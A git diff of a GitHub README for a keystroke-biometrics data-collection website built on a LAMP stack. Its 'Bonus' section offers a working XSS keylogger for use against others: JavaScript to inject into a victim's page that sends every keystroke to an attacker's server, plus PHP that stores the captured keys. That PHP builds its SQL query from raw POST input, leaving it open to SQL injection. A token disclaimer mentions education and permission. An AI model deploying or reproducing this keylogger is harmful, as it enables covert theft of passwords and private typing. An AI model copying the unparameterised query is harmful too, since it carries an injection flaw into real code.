@@ -11,18 +11,13 @@
 [![Stargazers][stars-shield]][stars-url]
 [![Issues][issues-shield]][issues-url]
 [![MIT License][license-shield]][license-url]
-[![LinkedIn][linkedin-shield]][linkedin-url]
-
-
 
 <!-- PROJECT LOGO -->
 <br />
 <p align="center">
   <a href="https://github.com/reevesba/keystrokebiometrics.xyz">
-    <img src="images/logo.png" alt="Logo" width="80" height="80">
+    <img src="assets/img/logo.png" alt="Logo">
   </a>
-
-  <h3 align="center">Keystroke Data Collector</h3>
 
   <p align="center">
     Collects keystroke data using the LAMP stack. 
@@ -37,8 +32,6 @@
     <a href="https://github.com/reevesba/keystrokebiometrics.xyz/issues">Request Feature</a>
   </p>
 </p>
-
-
 
 <!-- TABLE OF CONTENTS -->
 <details open="open">
@@ -62,7 +55,6 @@
     <li><a href="#contributing">Contributing</a></li>
     <li><a href="#license">License</a></li>
     <li><a href="#contact">Contact</a></li>
-    <li><a href="#acknowledgements">Acknowledgements</a></li>
   </ol>
 </details>
 
@@ -70,136 +62,189 @@
 
 <!-- ABOUT THE PROJECT -->
 ## About The Project
+![assets/img/site-screenshot.png](assets/img/site-screenshot.png)
 
-[![Product Name Screen Shot][product-screenshot]](https://example.com)
+This simple website was created to collect keystroke data for another one of my projects. For each keystroke, a record is inserted into a MySQL table. Here is the table schema: 
 
-There are many great README templates available on GitHub, however, I didn't find one that really suit my needs so I created this enhanced one. I want to create a README template so amazing that it'll be the last one you ever need -- I think this is it.
+<p align="center">
+  <a href="#">
+    <img src="assets/img/table-schema.png" alt="Logo">
+  </a>
+</p>
 
-Here's why:
-* Your time should be focused on creating something amazing. A project that solves a problem and helps others
-* You shouldn't be doing the same tasks over and over like creating a README from scratch
-* You should element DRY principles to the rest of your life :smile:
-
-Of course, no one template will serve all projects since your needs may be different. So I'll be adding more in the near future. You may also suggest changes by forking this repo and creating a pull request or opening an issue. Thanks to all the people have have contributed to expanding this template!
-
-A list of commonly used resources that I find helpful are listed in the acknowledgements.
+This will be used to create machine learning models. My current plan is to use this data to create features for an unsupervised learning model where users will hopefully be separated into clusters. In addition, I will be collecting bot keystroke data to create a supervised learning model that will distinguish between bot and not bot.
 
 ### Built With
+<a href="https://www.linuxfoundation.org/" target="_blank">
+  <img align="left" width="32px" src="https://cdn.jsdelivr.net/npm/simple-icons@3.13.0/icons/linux.svg" alt="linux">
+</a>
+<a href="https://www.apache.org/" target="_blank">
+  <img align="left" width="32px" src="https://cdn.jsdelivr.net/npm/simple-icons@3.13.0/icons/apache.svg" alt="apache">
+</a>
+<a href="https://www.mysql.com/" target="_blank">
+  <img align="left" width="32px" src="https://cdn.jsdelivr.net/npm/simple-icons@3.13.0/icons/mysql.svg" alt="mysql">
+</a>
+<a href="https://www.php.net/" target="_blank">
+  <img align="left" width="32px" src="https://cdn.jsdelivr.net/npm/simple-icons@3.13.0/icons/php.svg" alt="php">
+</a>
+<a href="https://www.javascript.com/" target="_blank">
+  <img align="left" width="32px" src="https://cdn.jsdelivr.net/npm/simple-icons@3.13.0/icons/javascript.svg" alt="javascript">
+</a>
+<a href="https://getbootstrap.com/" target="_blank">
+  <img align="left" width="32px" src="https://cdn.jsdelivr.net/npm/simple-icons@3.13.0/icons/bootstrap.svg" alt="bootstrap">
+</a>
 
-This section should list any major frameworks that you built your project using. Leave any add-ons/plugins for the acknowledgements section. Here are a few examples.
-* [Bootstrap](https://getbootstrap.com)
-* [JQuery](https://jquery.com)
-* [Laravel](https://laravel.com)
-
-
+<br />
+<br />
 
 <!-- GETTING STARTED -->
 ## Getting Started
-
-This is an example of how you may give instructions on setting up your project locally.
-To get a local copy up and running follow these simple example steps.
+This repository can be cloned onto your server to quickly start collecting user keystroke information.
 
 ### Prerequisites
+Configure your web server. Here are some useful articles for configuring a LAMP server. Of course, you have other options as well. 
 
-This is an example of how to list things you need to use the software and how to install them.
-* npm
-  ```sh
-  npm install npm@latest -g
-  ```
+- [Installing LAMP Stack on Ubuntu 18.04](https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-ubuntu-18-04)
+- [Securing Apache on Ubuntu 18.04](https://www.digitalocean.com/community/tutorials/how-to-secure-apache-with-let-s-encrypt-on-ubuntu-18-04)
+[]()
 
 ### Installation
-
-1. Get a free API Key at [https://example.com](https://example.com)
-2. Clone the repo
+1. Clone the repo into your /var/www directory or virtual host directory.
    ```sh
-   git clone https://github.com/your_username_/Project-Name.git
+   git clone https://github.com/reevesba/keystrokebiometrics.xyz
    ```
-3. Install NPM packages
-   ```sh
-   npm install
-   ```
-4. Enter your API in `config.js`
-   ```JS
-   const API_KEY = 'ENTER YOUR API';
-   ```
-
-
-
 <!-- USAGE EXAMPLES -->
 ## Usage
+The usage of this site is straighforward - use it to collect keystroke data. 
 
-Use this space to show useful examples of how a project can be used. Additional screenshots, code examples and demos work well in this space. You may also link to more resources.
+### Bonus
+Portions of this project can be used to create a XSS keylogger. <strong>Any malicious use of this software is not recommended and should be for educational purposes only. Be sure to have the permission of all parties involved.</strong>
 
-_For more examples, please refer to the [Documentation](https://example.com)_
+For an XSS keylogging attack, simply inject the following JavaScript into the victim's DOM.
 
+<details>
+<summary>View JavaScript</summary>
 
+```
+(function() {
+    const url = 'https://yourserverurl/assets/php/keylogger.php?';
+    const header = 'Content-type';
+    const value = 'application/x-www-form-urlencoded';
+
+    const postData = (event) => {
+        // Create request object
+        if (window.XMLHttpRequest) {
+            var request = new XMLHttpRequest();
+        } else {
+            var request = new ActiveXObject('Microsoft.XMLHTTP');
+        }
+
+        // Setup transmit data
+        var uuid = select('#uuid').value;
+        var altKey = event.altKey ? 1 : 0;
+        var ctrlKey = event.ctrlKey ? 1 : 0;
+        var shiftKey = event.shiftKey ? 1 : 0;
+
+        var data = 'uuid=' + uuid + 
+                   '&keyEvent=' + event.type + 
+                   '&keyCode=' + event.keyCode + 
+                   '&keyChar=' + event.key + 
+                   '&altKey=' + altKey + 
+                   '&ctrlKey=' + ctrlKey + 
+                   '&shiftKey=' + shiftKey + 
+                   '&timestamp=' + new Date().getTime();
+
+        // Uncomment to enable debugging
+        //console.log(data);
+
+        // Send data to server
+        request.open('POST', url, true);
+        request.setRequestHeader(header, value);
+        request.onreadystatechange = function() {
+            // Uncomment to enable debugging
+            //console.log(this.responseText);
+        }
+        request.send(data);
+    };
+
+    window.addEventListener('keydown', (event) => {
+        postData(event);
+    });
+})()
+```
+</details>
+
+On your server, create a PHP file to recieve the data. I called mine keylogger.php, but you can name it whatever you want. Just be sure to update the URL in the JavaScript file. Add the following code to the file. As you may notice, you will need to to set a couple of environment variables with your MySQL credentials.
+
+<details>
+<summary>View PHP</summary>
+
+```
+<?php
+// Establish database connection
+$username = $_ENV['MYSQL_USER'];
+$password = $_ENV['MYSQL_PASSWORD'];
+
+$connection = mysqli_connect('localhost', $username, $password, 'production');
+
+if (mysqli_connect_errno()) {
+    echo "Failed to connect to MySQL: " . mysqli_connect_error();
+}
+
+// Collect post data
+$uuid = $_POST['uuid'];
+$keyEvent = $_POST['keyEvent'];
+$keyCode = $_POST['keyCode'];
+$keyChar = $_POST['keyChar'];
+$altKey = $_POST['altKey'];
+$ctrlKey = $_POST['ctrlKey'];
+$shiftKey = $_POST['shiftKey'];
+$timestamp = $_POST['timestamp'];
+
+// Insert data
+if (!mysqli_query($connection, "INSERT INTO KEYSTROKE_METRICS (`uuid`, `key_event`, `key_code`, `key_char`, `alt_key`, `ctrl_key`, `shift_key`, `timestamp`) VALUES ('$uuid', '$keyEvent', '$keyCode', '$keyChar', '$altKey', '$ctrlKey', '$shiftKey', '$timestamp')")) {
+    echo("Error description: " . mysqli_error($connection));
+}
+
+// Close connection
+mysqli_close($connection);
+?>
+```
+</details>
 
 <!-- ROADMAP -->
 ## Roadmap
-
-See the [open issues](https://github.com/othneildrew/Best-README-Template/issues) for a list of proposed features (and known issues).
-
-
+See the [open issues](https://github.com/reevesba/keystrokebiometrics.xyz/issues) for a list of proposed features (and known issues).
 
 <!-- CONTRIBUTING -->
 ## Contributing
-
 Contributions are what make the open source community such an amazing place to be learn, inspire, and create. Any contributions you make are **greatly appreciated**.
 
 1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
+2. Create your Feature Branch (`git checkout -b feature/newFeature`)
+3. Commit your Changes (`git commit -m 'adding new feature xyz'`)
+4. Push to the Branch (`git push origin feature/newFeature`)
 5. Open a Pull Request
-
-
 
 <!-- LICENSE -->
 ## License
-
-Distributed under the MIT License. See `LICENSE` for more information.
-
-
+Distributed under the GPLv3 License. See `LICENSE` for more information.
 
 <!-- CONTACT -->
 ## Contact
+Bradley Reeves - reevesbra@outlook.com
 
-Your Name - [@your_twitter](https://twitter.com/your_username) - email@example.com
-
-Project Link: [https://github.com/your_username/repo_name](https://github.com/your_username/repo_name)
-
-
-
-<!-- ACKNOWLEDGEMENTS -->
-## Acknowledgements
-* [GitHub Emoji Cheat Sheet](https://www.webpagefx.com/tools/emoji-cheat-sheet)
-* [Img Shields](https://shields.io)
-* [Choose an Open Source License](https://choosealicense.com)
-* [GitHub Pages](https://pages.github.com)
-* [Animate.css](https://daneden.github.io/animate.css)
-* [Loaders.css](https://connoratherton.com/loaders)
-* [Slick Carousel](https://kenwheeler.github.io/slick)
-* [Smooth Scroll](https://github.com/cferdinandi/smooth-scroll)
-* [Sticky Kit](http://leafo.net/sticky-kit)
-* [JVectorMap](http://jvectormap.com)
-* [Font Awesome](https://fontawesome.com)
-
-
-
-
+Project Link: [https://github.com/reevesba/keystrokebiometrics.xyz](https://github.com/reevesba/keystrokebiometrics.xyz)
 
 <!-- MARKDOWN LINKS & IMAGES -->
 <!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
-[contributors-shield]: https://img.shields.io/github/contributors/othneildrew/Best-README-Template.svg?style=for-the-badge
-[contributors-url]: https://github.com/othneildrew/Best-README-Template/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/othneildrew/Best-README-Template.svg?style=for-the-badge
-[forks-url]: https://github.com/othneildrew/Best-README-Template/network/members
-[stars-shield]: https://img.shields.io/github/stars/othneildrew/Best-README-Template.svg?style=for-the-badge
-[stars-url]: https://github.com/othneildrew/Best-README-Template/stargazers
-[issues-shield]: https://img.shields.io/github/issues/othneildrew/Best-README-Template.svg?style=for-the-badge
-[issues-url]: https://github.com/othneildrew/Best-README-Template/issues
-[license-shield]: https://img.shields.io/github/license/othneildrew/Best-README-Template.svg?style=for-the-badge
-[license-url]: https://github.com/othneildrew/Best-README-Template/blob/master/LICENSE.txt
-[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
-[linkedin-url]: https://linkedin.com/in/othneildrew
-[product-screenshot]: images/screenshot.png
+[contributors-shield]: https://img.shields.io/github/contributors/reevesba/keystrokebiometrics.xyz.svg?style=for-the-badge
+[contributors-url]: https://github.com/reevesba/keystrokebiometrics.xyz/graphs/contributors
+[forks-shield]: https://img.shields.io/github/forks/reevesba/keystrokebiometrics.xyz.svg?style=for-the-badge
+[forks-url]: https://github.com/reevesba/keystrokebiometrics.xyz/network/members
+[stars-shield]: https://img.shields.io/github/stars/reevesba/keystrokebiometrics.xyz.svg?style=for-the-badge
+[stars-url]: https://github.com/reevesba/keystrokebiometrics.xyz/stargazers
+[issues-shield]: https://img.shields.io/github/issues/reevesba/keystrokebiometrics.xyz.svg?style=for-the-badge
+[issues-url]: https://github.com/reevesba/keystrokebiometrics.xyz/issues
+[license-shield]: https://img.shields.io/github/license/reevesba/keystrokebiometrics.xyz.svg?style=for-the-badge
+[license-url]: https://github.com/reevesba/keystrokebiometrics.xyz/blob/master/LICENSE.txt
